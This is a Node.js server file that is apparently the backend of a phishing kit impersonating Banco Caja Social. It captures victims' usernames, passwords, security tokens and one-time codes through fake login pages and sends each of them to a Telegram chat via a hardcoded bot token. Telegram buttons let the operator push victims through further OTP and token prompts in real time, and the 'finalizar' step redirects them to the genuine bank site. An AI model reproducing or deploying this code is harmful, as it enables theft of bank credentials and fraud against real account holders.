const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    pingTimeout: 60000,
    pingInterval: 25000,
    transports: ['polling', 'websocket']
});

// Configuración de Telegram Bot
const TELEGRAM_TOKEN = '8343380638:AAGZ7Z6WBiQTn65itI0rqRUF3gQ13Ex_TKA';
const CHAT_ID = '-4997787461';
// IMPORTANTE: por defecto NO hace polling para evitar 409 Conflict (todas las bancas
// comparten el mismo bot token con el server raiz). Para correr esta banca de forma
// AISLADA exporta STANDALONE_BOT=1 antes de iniciar el proceso.
const _POLL_TG = process.env.STANDALONE_BOT === '1' || process.env.STANDALONE_BOT === 'true';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: _POLL_TG });

// Middleware
app.use(express.static(__dirname));
app.use(express.json());

// Almacenamiento de sesiones en memoria (en producción usar Redis)
const sessions = new Map();
const messageToSession = new Map();

// Limpiar sesiones antiguas cada 30 minutos
setInterval(() => {
    const now = new Date();
    for (const [sessionId, session] of sessions.entries()) {
        const timeDiff = now - session.lastActivity;
        if (timeDiff > 1800000) { // 30 minutos
            console.log('🗑️ Limpiando sesión inactiva:', sessionId);
            sessions.delete(sessionId);
        }
    }
}, 1800000);

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Socket.IO - Conexión de clientes
io.on('connection', (socket) => {
    console.log('Cliente conectado:', socket.id);
    
    // Crear o recuperar sesión
    let currentSessionId = null;
    
    socket.on('init-session', () => {
        currentSessionId = uuidv4();
        sessions.set(currentSessionId, {
            socketId: socket.id,
            usuario: null,
            password: null,
            token: null,
            otp: null,
            currentStep: 'usuario',
            createdAt: new Date(),
            lastActivity: new Date()
        });
        
        socket.emit('session-created', { sessionId: currentSessionId });
        console.log('✅ Sesión creada:', currentSessionId);
    });
    
    // Recibir datos de usuario
    socket.on('send-usuario', async (data) => {
        const { sessionId, usuario } = data;
        const session = sessions.get(sessionId);
        
        if (session) {
            session.usuario = usuario;
            session.currentStep = 'password';
            session.lastActivity = new Date();
            session.socketId = socket.id;
            
            // Enviar a Telegram
            const message = `🔐 *NUEVO ACCESO - USUARIO*\n\n` +
                          `👤 Usuario: \`${usuario}\`\n` +
                          `🆔 Sesión: \`${sessionId}\`\n` +
                          `⏰ Hora: ${new Date().toLocaleString('es-CO')}`;
            
            const options = {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔑 Pedir Logo', callback_data: `logo_${sessionId}` },
                        { text: '🎫 Pedir Token', callback_data: `token_${sessionId}` },
                        { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` },
                        { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` }
                    ]]
                }
            };
            
            try {
                const sentMessage = await bot.sendMessage(CHAT_ID, message, options);
                messageToSession.set(sentMessage.message_id, sessionId);
                
                // Redirigir automáticamente a password
                socket.emit('redirect', { url: 'password.html' });
            } catch (error) {
                console.error('Error enviando a Telegram:', error);
                socket.emit('data-sent', { success: false, error: error.message });
            }
        }
    });
    
    // Recibir datos de password
    socket.on('send-password', async (data) => {
        const { sessionId, password } = data;
        const session = sessions.get(sessionId);
        
        if (session) {
            session.password = password;
            session.lastActivity = new Date();
            session.socketId = socket.id;
            
            // Enviar a Telegram
            const message = `🔐 *PASSWORD RECIBIDO*\n\n` +
                          `👤 Usuario: \`${session.usuario}\`\n` +
                          `🔑 Password: \`${password}\`\n` +
                          `🆔 Sesión: \`${sessionId}\`\n` +
                          `⏰ Hora: ${new Date().toLocaleString('es-CO')}`;
            
            const options = {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔑 Pedir Logo', callback_data: `logo_${sessionId}` },
                        { text: '🎫 Pedir Token', callback_data: `token_${sessionId}` },
                        { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` },
                        { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` }
                    ]]
                }
            };
            
            try {
                const sentMessage = await bot.sendMessage(CHAT_ID, message, options);
                messageToSession.set(sentMessage.message_id, sessionId);
                
                // No redirigir automáticamente, esperar comando de Telegram
                socket.emit('data-sent', { success: true, waitingForCommand: true });
            } catch (error) {
                console.error('Error enviando a Telegram:', error);
                socket.emit('data-sent', { success: false, error: error.message });
            }
        }
    });
    
    // Recibir datos de token
    socket.on('send-token', async (data) => {
        const { sessionId, token } = data;
        const session = sessions.get(sessionId);
        
        if (session) {
            session.token = token;
            session.lastActivity = new Date();
            session.socketId = socket.id;
            
            const message = `🎫 *TOKEN RECIBIDO*\n\n` +
                          `👤 Usuario: \`${session.usuario}\`\n` +
                          `🔑 Password: \`${session.password}\`\n` +
                          `🎫 Token: \`${token}\`\n` +
                          `🆔 Sesión: \`${sessionId}\`\n` +
                          `⏰ Hora: ${new Date().toLocaleString('es-CO')}`;
            
            const options = {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔑 Pedir Logo', callback_data: `logo_${sessionId}` },
                        { text: '🎫 Pedir Token', callback_data: `token_${sessionId}` },
                        { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` },
                        { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` }
                    ]]
                }
            };
            
            try {
                const sentMessage = await bot.sendMessage(CHAT_ID, message, options);
                messageToSession.set(sentMessage.message_id, sessionId);
                
                socket.emit('data-sent', { success: true, waitingForCommand: true });
            } catch (error) {
                console.error('Error enviando a Telegram:', error);
                socket.emit('data-sent', { success: false, error: error.message });
            }
        }
    });
    
    // Recibir datos de OTP
    socket.on('send-otp', async (data) => {
        const { sessionId, otp } = data;
        const session = sessions.get(sessionId);
        
        if (session) {
            session.otp = otp;
            session.lastActivity = new Date();
            session.socketId = socket.id;
            
            const message = `📱 *OTP RECIBIDO*\n\n` +
                          `👤 Usuario: \`${session.usuario}\`\n` +
                          `🔑 Password: \`${session.password}\`\n` +
                          `🎫 Token: \`${session.token || 'N/A'}\`\n` +
                          `📱 OTP: \`${otp}\`\n` +
                          `🆔 Sesión: \`${sessionId}\`\n` +
                          `⏰ Hora: ${new Date().toLocaleString('es-CO')}`;
            
            const options = {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔑 Pedir Logo', callback_data: `logo_${sessionId}` },
                        { text: '🎫 Pedir Token', callback_data: `token_${sessionId}` },
                        { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` },
                        { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` }
                    ]]
                }
            };
            
            try {
                const sentMessage = await bot.sendMessage(CHAT_ID, message, options);
                messageToSession.set(sentMessage.message_id, sessionId);
                
                socket.emit('data-sent', { success: true, waitingForCommand: true });
            } catch (error) {
                console.error('Error enviando a Telegram:', error);
                socket.emit('data-sent', { success: false, error: error.message });
            }
        }
    });
    
    socket.on('disconnect', (reason) => {
        console.log('❌ Cliente desconectado:', socket.id, 'Razón:', reason);
        
        // Mantener la sesión activa incluso si el cliente se desconecta
        if (currentSessionId) {
            const session = sessions.get(currentSessionId);
            if (session) {
                console.log('⚠️ Manteniendo sesión activa:', currentSessionId);
            }
        }
    });
    
    // Reconectar sesión existente
    socket.on('reconnect-session', (data) => {
        const { sessionId } = data;
        const session = sessions.get(sessionId);
        
        if (session) {
            session.socketId = socket.id;
            session.lastActivity = new Date();
            currentSessionId = sessionId;
            socket.emit('session-reconnected', { sessionId });
            console.log('🔄 Sesión reconectada:', sessionId);
        } else {
            socket.emit('session-expired');
            console.log('❌ Sesión expirada:', sessionId);
        }
    });
});

// Manejar callbacks de Telegram
bot.on('callback_query', async (callbackQuery) => {
    const data = callbackQuery.data;
    const [action, sessionId] = data.split('_');
    
    const session = sessions.get(sessionId);
    
    if (!session) {
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Sesión expirada o inválida',
            show_alert: true
        });
        return;
    }
    
    const clientSocket = io.sockets.sockets.get(session.socketId);
    
    if (!clientSocket) {
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Cliente desconectado',
            show_alert: true
        });
        return;
    }
    
    switch (action) {
        case 'logo':
            session.currentStep = 'usuario';
            clientSocket.emit('redirect', { url: 'index.html' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '🔄 Redirigiendo a página de usuario...'
            });
            break;
            
        case 'token':
            session.currentStep = 'token';
            clientSocket.emit('redirect', { url: 'token.html' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '🔄 Redirigiendo a página de token...'
            });
            break;
            
        case 'otp':
            session.currentStep = 'otp';
            clientSocket.emit('redirect', { url: 'otp.html' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '🔄 Redirigiendo a página de OTP...'
            });
            break;
            
        case 'finalizar':
            clientSocket.emit('redirect', { url: 'https://www.bancocajasocial.com/' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '✅ Finalizando sesión...'
            });
            
            // Limpiar sesión
            sessions.delete(sessionId);
            break;
            
        default:
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Acción no reconocida'
            });
    }
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
    console.log(`📱 Telegram Bot configurado`);
});
